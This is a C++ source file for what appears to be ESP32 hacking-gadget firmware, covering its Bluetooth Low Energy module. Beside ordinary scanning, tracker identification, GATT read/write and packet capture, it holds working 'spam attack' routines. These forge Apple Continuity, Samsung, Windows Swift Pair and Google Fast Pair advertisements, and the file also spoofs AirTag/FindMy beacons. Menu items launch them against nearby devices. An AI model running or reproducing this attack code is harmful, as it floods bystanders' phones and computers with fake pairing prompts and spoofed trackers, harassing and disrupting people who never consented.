/**
 * ShitBird Firmware - BLE Module Implementation
 */

#include "ble_module.h"
#include "../../core/system.h"
#include "../../core/storage.h"
#include "../../ui/ui_manager.h"
#include <esp_random.h>

// Static member initialization
bool BLEModule::initialized = false;
bool BLEModule::scanning = false;
bool BLEModule::spamming = false;
bool BLEModule::capturing = false;
bool BLEModule::connected = false;
BLEAttackType BLEModule::currentAttack = BLEAttackType::NONE;

std::vector<BLEDeviceInfo> BLEModule::devices;
std::vector<BLEDeviceInfo> BLEModule::airtags;
std::vector<BLEPacket> BLEModule::capturedPackets;

NimBLEClient* BLEModule::pClient = nullptr;
NimBLEAdvertising* BLEModule::pAdvertising = nullptr;
NimBLEScan* BLEModule::pScan = nullptr;

TaskHandle_t BLEModule::spamTaskHandle = nullptr;
TaskHandle_t BLEModule::scanTaskHandle = nullptr;

BLEModule::ScanCallbacks BLEModule::scanCallbacks;

void BLEModule::init() {
    if (initialized) return;

    Serial.println("[BLE] Initializing...");

    // Initialize NimBLE
    NimBLEDevice::init("ShitBird");
    NimBLEDevice::setPower(ESP_PWR_LVL_P9);  // Max power
    NimBLEDevice::setMTU(517);

    // Get scan instance
    pScan = NimBLEDevice::getScan();
    pScan->setAdvertisedDeviceCallbacks(&scanCallbacks, false);
    pScan->setActiveScan(true);
    pScan->setInterval(100);
    pScan->setWindow(99);
    pScan->setMaxResults(0);  // Don't store results, use callback

    // Get advertising instance
    pAdvertising = NimBLEDevice::getAdvertising();

    initialized = true;
    Serial.println("[BLE] Initialized");
}

void BLEModule::update() {
    if (!initialized) return;

    // Update BLE statistics
    g_systemState.bleDevicesFound = devices.size();

    // Prune old devices (not seen in 60 seconds)
    uint32_t now = millis();
    devices.erase(
        std::remove_if(devices.begin(), devices.end(),
            [now](const BLEDeviceInfo& d) {
                return (now - d.lastSeen) > 60000;
            }),
        devices.end()
    );
}

void BLEModule::deinit() {
    if (!initialized) return;

    stopScan();
    stopSpam();
    disconnect();

    NimBLEDevice::deinit(true);
    initialized = false;
}

// ============================================================================
// Scanning
// ============================================================================

void BLEModule::startScan(uint32_t duration) {
    if (!initialized || scanning) return;

    Serial.println("[BLE] Starting scan...");
    scanning = true;
    g_systemState.currentMode = OperationMode::BLE_SCAN;

    // Clear previous results if starting fresh
    // devices.clear();  // Optional: keep previous devices

    if (duration == 0) {
        // Continuous scanning
        pScan->start(0, false);
    } else {
        pScan->start(duration, false);
    }

    Storage::logf("ble", "Scan started, duration: %d", duration);
}

void BLEModule::stopScan() {
    if (!scanning) return;

    Serial.println("[BLE] Stopping scan...");
    pScan->stop();
    scanning = false;

    if (g_systemState.currentMode == OperationMode::BLE_SCAN) {
        g_systemState.currentMode = OperationMode::IDLE;
    }

    Storage::logf("ble", "Scan stopped, found %d devices", devices.size());
}

bool BLEModule::isScanning() {
    return scanning;
}

std::vector<BLEDeviceInfo>& BLEModule::getDevices() {
    return devices;
}

void BLEModule::clearDevices() {
    devices.clear();
}

BLEDeviceInfo* BLEModule::getDevice(const String& address) {
    for (auto& device : devices) {
        if (device.address == address) {
            return &device;
        }
    }
    return nullptr;
}

// Scan callback implementation
void BLEModule::ScanCallbacks::onResult(NimBLEAdvertisedDevice* device) {
    String address = device->getAddress().toString().c_str();

    // Check if device already exists
    BLEDeviceInfo* existing = nullptr;
    for (auto& d : devices) {
        if (d.address == address) {
            existing = &d;
            break;
        }
    }

    if (existing) {
        // Update existing device
        existing->rssi = device->getRSSI();
        existing->lastSeen = millis();
        if (device->haveName()) {
            existing->name = device->getName().c_str();
            existing->hasName = true;
        }
    } else {
        // New device
        BLEDeviceInfo info;
        info.address = address;
        info.name = device->haveName() ? device->getName().c_str() : "";
        info.hasName = device->haveName();
        info.rssi = device->getRSSI();
        info.isConnectable = device->isConnectable();
        info.appearance = device->getAppearance();
        info.lastSeen = millis();
        info.addressType = device->getAddress().getType();

        // Get service UUIDs
        if (device->haveServiceUUID()) {
            for (int i = 0; i < device->getServiceUUIDCount(); i++) {
                info.serviceUUIDs.push_back(device->getServiceUUID(i).toString().c_str());
            }
        }

        // Get manufacturer data
        if (device->haveManufacturerData()) {
            std::string mfgData = device->getManufacturerData();
            if (mfgData.length() >= 2) {
                uint16_t companyId = (uint8_t)mfgData[0] | ((uint8_t)mfgData[1] << 8);
                std::vector<uint8_t> data(mfgData.begin() + 2, mfgData.end());
                info.manufacturerData[companyId] = data;
            }
        }

        // Identify device type
        identifyDevice(info);

        devices.push_back(info);

        // Check if it's an AirTag
        if (info.isTracker && info.isApple) {
            airtags.push_back(info);
        }

        // Log discovery
        if (capturing) {
            BLEPacket pkt;
            pkt.timestamp = millis();
            pkt.address = address;
            pkt.rssi = device->getRSSI();
            pkt.type = 0;  // Advertisement
            // Store raw data if needed
            capturedPackets.push_back(pkt);
        }
    }
}

void BLEModule::onScanComplete(NimBLEScanResults results) {
    Serial.printf("[BLE] Scan complete, %d devices found\n", devices.size());
    scanning = false;
}

void BLEModule::identifyDevice(BLEDeviceInfo& device) {
    device.isApple = false;
    device.isSamsung = false;
    device.isGoogle = false;
    device.isMicrosoft = false;
    device.isTracker = false;
    device.deviceType = "Unknown";

    // Check manufacturer data
    for (const auto& mfg : device.manufacturerData) {
        uint16_t companyId = mfg.first;

        switch (companyId) {
            case 0x004C:  // Apple
                device.isApple = true;
                device.deviceType = "Apple Device";

                // Check for AirTag/FindMy
                if (mfg.second.size() > 0 && mfg.second[0] == 0x12) {
                    device.isTracker = true;
                    device.deviceType = "Apple AirTag/FindMy";
                }
                break;

            case 0x0075:  // Samsung
                device.isSamsung = true;
                device.deviceType = "Samsung Device";

                // Check for SmartTag
                if (device.name.indexOf("SmartTag") >= 0) {
                    device.isTracker = true;
                    device.deviceType = "Samsung SmartTag";
                }
                break;

            case 0x00E0:  // Google
                device.isGoogle = true;
                device.deviceType = "Google Device";
                break;

            case 0x0006:  // Microsoft
                device.isMicrosoft = true;
                device.deviceType = "Microsoft Device";
                break;

            case 0x0059:  // Nordic (often Tile)
                if (device.name.indexOf("Tile") >= 0) {
                    device.isTracker = true;
                    device.deviceType = "Tile Tracker";
                }
                break;
        }
    }

    // Check by name patterns
    if (device.hasName) {
        String nameLower = device.name;
        nameLower.toLowerCase();

        if (nameLower.indexOf("airpods") >= 0) {
            device.isApple = true;
            device.deviceType = "Apple AirPods";
        } else if (nameLower.indexOf("watch") >= 0 && device.isSamsung) {
            device.deviceType = "Samsung Watch";
        } else if (nameLower.indexOf("buds") >= 0 && device.isSamsung) {
            device.deviceType = "Samsung Buds";
        } else if (nameLower.indexOf("pixel") >= 0) {
            device.isGoogle = true;
            device.deviceType = "Google Pixel";
        }
    }

    // Check service UUIDs
    for (const String& uuid : device.serviceUUIDs) {
        if (uuid.indexOf("fd6f") >= 0) {
            // COVID exposure notification
            device.deviceType = "Exposure Notification";
        } else if (uuid.indexOf("fe2c") >= 0) {
            // Tile
            device.isTracker = true;
            device.deviceType = "Tile Tracker";
        }
    }
}

// ============================================================================
// Spam Attacks
// ============================================================================

void BLEModule::startSpam(BLEAttackType type) {
    if (spamming) stopSpam();

    Serial.printf("[BLE] Starting spam attack type: %d\n", (int)type);
    spamming = true;
    currentAttack = type;
    g_systemState.currentMode = OperationMode::BLE_ATTACK;

    // Create spam task
    xTaskCreatePinnedToCore(
        spamTask,
        "BLE_Spam",
        4096,
        nullptr,
        1,
        &spamTaskHandle,
        0  // Core 0
    );

    Storage::logf("ble", "Spam attack started, type: %d", (int)type);
}

void BLEModule::stopSpam() {
    if (!spamming) return;

    Serial.println("[BLE] Stopping spam attack");
    spamming = false;

    if (spamTaskHandle) {
        vTaskDelete(spamTaskHandle);
        spamTaskHandle = nullptr;
    }

    pAdvertising->stop();
    currentAttack = BLEAttackType::NONE;

    if (g_systemState.currentMode == OperationMode::BLE_ATTACK) {
        g_systemState.currentMode = OperationMode::IDLE;
    }

    Storage::log("ble", "Spam attack stopped");
}

bool BLEModule::isSpamming() {
    return spamming;
}

BLEAttackType BLEModule::getCurrentAttack() {
    return currentAttack;
}

void BLEModule::spamTask(void* param) {
    while (spamming) {
        switch (currentAttack) {
            case BLEAttackType::APPLE_SPAM:
                sendAppleSpam();
                break;
            case BLEAttackType::SAMSUNG_SPAM:
                sendSamsungSpam();
                break;
            case BLEAttackType::WINDOWS_SWIFT_PAIR:
                sendSwiftPairSpam();
                break;
            case BLEAttackType::GOOGLE_FAST_PAIR:
                sendGoogleFastPairSpam();
                break;
            case BLEAttackType::AIRTAG_SPOOF:
                sendAirtagSpam();
                break;
            case BLEAttackType::ALL_SPAM:
                sendAllSpam();
                break;
            default:
                break;
        }

        vTaskDelay(pdMS_TO_TICKS(g_systemState.settings.ble.spamInterval));
    }

    vTaskDelete(nullptr);
}

void BLEModule::sendAppleSpam() {
    // Random Apple device advertisement
    uint8_t payload[31];
    int payloadLen = 0;

    // Build Apple Continuity advertisement
    payload[payloadLen++] = 0x1E;  // Length
    payload[payloadLen++] = 0xFF;  // Manufacturer specific
    payload[payloadLen++] = 0x4C;  // Apple (low byte)
    payload[payloadLen++] = 0x00;  // Apple (high byte)

    // Random device type
    uint8_t deviceType = esp_random() % 5;
    switch (deviceType) {
        case 0:  // AirPods
            payload[payloadLen++] = AppleSpam::TYPE_PROXIMITY;
            payload[payloadLen++] = 0x19;
            payload[payloadLen++] = 0x01;
            payload[payloadLen++] = 0x0E;  // AirPods device type
            break;
        case 1:  // AirPods Pro
            payload[payloadLen++] = AppleSpam::TYPE_PROXIMITY;
            payload[payloadLen++] = 0x19;
            payload[payloadLen++] = 0x01;
            payload[payloadLen++] = 0x14;  // AirPods Pro
            break;
        case 2:  // Apple TV
            payload[payloadLen++] = AppleSpam::TYPE_PROXIMITY;
            payload[payloadLen++] = 0x19;
            payload[payloadLen++] = 0x01;
            payload[payloadLen++] = 0x02;  // Apple TV
            break;
        case 3:  // HomePod
            payload[payloadLen++] = AppleSpam::TYPE_PROXIMITY;
            payload[payloadLen++] = 0x19;
            payload[payloadLen++] = 0x01;
            payload[payloadLen++] = 0x06;  // HomePod
            break;
        case 4:  // Nearby Action
            payload[payloadLen++] = AppleSpam::TYPE_NEARBY_ACTION;
            payload[payloadLen++] = 0x05;
            payload[payloadLen++] = esp_random() & 0xFF;
            break;
    }

    // Fill rest with random data
    while (payloadLen < 25) {
        payload[payloadLen++] = esp_random() & 0xFF;
    }

    // Set random MAC address
    uint8_t mac[6];
    for (int i = 0; i < 6; i++) {
        mac[i] = esp_random() & 0xFF;
    }
    mac[0] |= 0xC0;  // Random address type

    // Configure and start advertising
    NimBLEAdvertisementData advData;
    advData.addData(std::string((char*)payload, payloadLen));

    pAdvertising->stop();
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
}

void BLEModule::sendSamsungSpam() {
    uint8_t payload[31];
    int payloadLen = 0;

    // Samsung Watch advertisement
    payload[payloadLen++] = 0x15;  // Length
    payload[payloadLen++] = 0xFF;  // Manufacturer specific
    payload[payloadLen++] = 0x75;  // Samsung (low byte)
    payload[payloadLen++] = 0x00;  // Samsung (high byte)

    // Samsung device data
    payload[payloadLen++] = 0x42;
    payload[payloadLen++] = 0x09;
    payload[payloadLen++] = 0x81;
    payload[payloadLen++] = 0x02;
    payload[payloadLen++] = 0x14;
    payload[payloadLen++] = 0x15;
    payload[payloadLen++] = 0x03;
    payload[payloadLen++] = 0x21;
    payload[payloadLen++] = 0x01;
    payload[payloadLen++] = 0x09;

    // Random data
    while (payloadLen < 20) {
        payload[payloadLen++] = esp_random() & 0xFF;
    }

    NimBLEAdvertisementData advData;
    advData.addData(std::string((char*)payload, payloadLen));

    pAdvertising->stop();
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
}

void BLEModule::sendSwiftPairSpam() {
    uint8_t payload[31];
    int payloadLen = 0;

    // Flags
    payload[payloadLen++] = 0x02;
    payload[payloadLen++] = 0x01;
    payload[payloadLen++] = 0x06;

    // Complete local name (random)
    char name[16];
    snprintf(name, sizeof(name), "Device_%04X", (uint16_t)esp_random());
    int nameLen = strlen(name);
    payload[payloadLen++] = nameLen + 1;
    payload[payloadLen++] = 0x09;  // Complete local name
    memcpy(&payload[payloadLen], name, nameLen);
    payloadLen += nameLen;

    // Microsoft Swift Pair
    payload[payloadLen++] = 0x06;
    payload[payloadLen++] = 0xFF;
    payload[payloadLen++] = 0x06;  // Microsoft (low byte)
    payload[payloadLen++] = 0x00;  // Microsoft (high byte)
    payload[payloadLen++] = 0x03;
    payload[payloadLen++] = 0x00;
    payload[payloadLen++] = 0x80;

    NimBLEAdvertisementData advData;
    advData.addData(std::string((char*)payload, payloadLen));

    pAdvertising->stop();
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
}

void BLEModule::sendGoogleFastPairSpam() {
    uint8_t payload[31];
    int payloadLen = 0;

    // Flags
    payload[payloadLen++] = 0x02;
    payload[payloadLen++] = 0x01;
    payload[payloadLen++] = 0x06;

    // Google Fast Pair Service Data
    payload[payloadLen++] = 0x06;
    payload[payloadLen++] = 0x16;  // Service Data
    payload[payloadLen++] = 0x2C;  // Fast Pair UUID (low)
    payload[payloadLen++] = 0xFE;  // Fast Pair UUID (high)

    // Random model ID
    uint32_t modelId = esp_random() & 0xFFFFFF;
    payload[payloadLen++] = (modelId >> 16) & 0xFF;
    payload[payloadLen++] = (modelId >> 8) & 0xFF;
    payload[payloadLen++] = modelId & 0xFF;

    NimBLEAdvertisementData advData;
    advData.addData(std::string((char*)payload, payloadLen));

    pAdvertising->stop();
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
}

void BLEModule::sendAirtagSpam() {
    uint8_t payload[31];
    int payloadLen = 0;

    // AirTag FindMy advertisement
    payload[payloadLen++] = 0x1E;
    payload[payloadLen++] = 0xFF;
    payload[payloadLen++] = 0x4C;  // Apple
    payload[payloadLen++] = 0x00;
    payload[payloadLen++] = 0x12;  // FindMy type
    payload[payloadLen++] = 0x19;
    payload[payloadLen++] = 0x10;

    // Random public key bytes
    for (int i = 0; i < 22; i++) {
        payload[payloadLen++] = esp_random() & 0xFF;
    }

    NimBLEAdvertisementData advData;
    advData.addData(std::string((char*)payload, payloadLen));

    pAdvertising->stop();
    pAdvertising->setAdvertisementData(advData);
    pAdvertising->start();
}

void BLEModule::sendAllSpam() {
    // Cycle through all spam types
    static int currentSpamType = 0;

    switch (currentSpamType % 5) {
        case 0: sendAppleSpam(); break;
        case 1: sendSamsungSpam(); break;
        case 2: sendSwiftPairSpam(); break;
        case 3: sendGoogleFastPairSpam(); break;
        case 4: sendAirtagSpam(); break;
    }

    currentSpamType++;
}

// ============================================================================
// GATT Operations
// ============================================================================

bool BLEModule::connect(const String& address) {
    if (connected) disconnect();

    Serial.printf("[BLE] Connecting to %s\n", address.c_str());

    pClient = NimBLEDevice::createClient();
    NimBLEAddress addr(address.c_str());

    if (pClient->connect(addr)) {
        connected = true;
        Serial.println("[BLE] Connected");
        return true;
    }

    Serial.println("[BLE] Connection failed");
    return false;
}

void BLEModule::disconnect() {
    if (pClient && connected) {
        pClient->disconnect();
        NimBLEDevice::deleteClient(pClient);
        pClient = nullptr;
        connected = false;
        Serial.println("[BLE] Disconnected");
    }
}

bool BLEModule::isConnected() {
    return connected && pClient && pClient->isConnected();
}

std::vector<GATTServiceInfo> BLEModule::enumerateServices() {
    std::vector<GATTServiceInfo> services;

    if (!isConnected()) return services;

    std::vector<NimBLERemoteService*>* svcList = pClient->getServices(true);
    if (!svcList) return services;

    for (auto* svc : *svcList) {
        GATTServiceInfo info;
        info.uuid = svc->getUUID().toString().c_str();

        // Get characteristics
        std::vector<NimBLERemoteCharacteristic*>* charList = svc->getCharacteristics(true);
        if (charList) {
            for (auto* chr : *charList) {
                info.characteristics.push_back(chr->getUUID().toString().c_str());
            }
        }

        services.push_back(info);
    }

    return services;
}

std::vector<uint8_t> BLEModule::readCharacteristic(const String& serviceUUID, const String& charUUID) {
    std::vector<uint8_t> data;

    if (!isConnected()) return data;

    NimBLERemoteService* svc = pClient->getService(serviceUUID.c_str());
    if (!svc) return data;

    NimBLERemoteCharacteristic* chr = svc->getCharacteristic(charUUID.c_str());
    if (!chr) return data;

    if (chr->canRead()) {
        NimBLEAttValue val = chr->readValue();
        data.assign(val.data(), val.data() + val.length());
    }

    return data;
}

bool BLEModule::writeCharacteristic(const String& serviceUUID, const String& charUUID, const std::vector<uint8_t>& data) {
    if (!isConnected()) return false;

    NimBLERemoteService* svc = pClient->getService(serviceUUID.c_str());
    if (!svc) return false;

    NimBLERemoteCharacteristic* chr = svc->getCharacteristic(charUUID.c_str());
    if (!chr) return false;

    if (chr->canWrite()) {
        return chr->writeValue(data.data(), data.size());
    }

    return false;
}

// ============================================================================
// AirTag Operations
// ============================================================================

void BLEModule::startAirtagSniff() {
    airtags.clear();
    startScan(0);  // Continuous scan
    Storage::log("ble", "AirTag sniffing started");
}

void BLEModule::stopAirtagSniff() {
    stopScan();
    Storage::logf("ble", "AirTag sniffing stopped, found %d tags", airtags.size());
}

void BLEModule::spoofAirtag(const uint8_t* payload, size_t len) {
    if (len > 27) len = 27;

    uint8_t advData[31];
    advData[0] = len + 3;
    advData[1] = 0xFF;
    advData[2] = 0x4C;
    advData[3] = 0x00;
    memcpy(&advData[4], payload, len);

    NimBLEAdvertisementData data;
    data.addData(std::string((char*)advData, len + 4));

    pAdvertising->stop();
    pAdvertising->setAdvertisementData(data);
    pAdvertising->start();
}

std::vector<BLEDeviceInfo>& BLEModule::getAirtagList() {
    return airtags;
}

// ============================================================================
// Packet Capture
// ============================================================================

void BLEModule::startCapture() {
    capturedPackets.clear();
    capturing = true;
    Storage::log("ble", "Packet capture started");
}

void BLEModule::stopCapture() {
    capturing = false;
    Storage::logf("ble", "Packet capture stopped, %d packets", capturedPackets.size());
}

bool BLEModule::isCapturing() {
    return capturing;
}

std::vector<BLEPacket>& BLEModule::getCapturedPackets() {
    return capturedPackets;
}

bool BLEModule::exportPackets(const char* filename) {
    // Export as CSV for now
    String path = String(PATH_PCAP) + "/" + filename;

    String csv = "timestamp,address,rssi,type\n";
    for (const auto& pkt : capturedPackets) {
        csv += String(pkt.timestamp) + "," + pkt.address + "," +
               String(pkt.rssi) + "," + String(pkt.type) + "\n";
    }

    return Storage::writeFile(path.c_str(), csv.c_str());
}

// ============================================================================
// Menu Integration
// ============================================================================

void BLEModule::buildMenu(void* menuPtr) {
    MenuScreen* menu = static_cast<MenuScreen*>(menuPtr);

    // Scan submenu
    menu->addItem(MenuItem("Start Scan", []() {
        BLEModule::startScan(30);
        UIManager::showMessage("BLE Scan", "Scanning for 30s...");
    }));

    menu->addItem(MenuItem("Stop Scan", []() {
        BLEModule::stopScan();
        UIManager::showMessage("BLE Scan", "Scan stopped");
    }));

    menu->addItem(MenuItem("View Devices", []() {
        // TODO: Show device list screen
        auto& devices = BLEModule::getDevices();
        String msg = String(devices.size()) + " devices found";
        UIManager::showMessage("BLE Devices", msg);
    }));

    // Spam attacks
    menu->addItem(MenuItem("Apple Spam", []() {
        BLEModule::startSpam(BLEAttackType::APPLE_SPAM);
        UIManager::showMessage("BLE Attack", "Apple spam started");
    }));

    menu->addItem(MenuItem("Samsung Spam", []() {
        BLEModule::startSpam(BLEAttackType::SAMSUNG_SPAM);
        UIManager::showMessage("BLE Attack", "Samsung spam started");
    }));

    menu->addItem(MenuItem("Swift Pair Spam", []() {
        BLEModule::startSpam(BLEAttackType::WINDOWS_SWIFT_PAIR);
        UIManager::showMessage("BLE Attack", "Swift Pair spam started");
    }));

    menu->addItem(MenuItem("Google Fast Pair", []() {
        BLEModule::startSpam(BLEAttackType::GOOGLE_FAST_PAIR);
        UIManager::showMessage("BLE Attack", "Fast Pair spam started");
    }));

    menu->addItem(MenuItem("Spam All", []() {
        BLEModule::startSpam(BLEAttackType::ALL_SPAM);
        UIManager::showMessage("BLE Attack", "All spam started");
    }));

    menu->addItem(MenuItem("Stop Spam", []() {
        BLEModule::stopSpam();
        UIManager::showMessage("BLE Attack", "Spam stopped");
    }));

    // AirTag
    menu->addItem(MenuItem("AirTag Sniff", []() {
        BLEModule::startAirtagSniff();
        UIManager::showMessage("AirTag", "Sniffing for AirTags...");
    }));

    menu->addItem(MenuItem("< Back", nullptr));
    static_cast<MenuItem&>(menu->items.back()).type = MenuItemType::BACK;
}
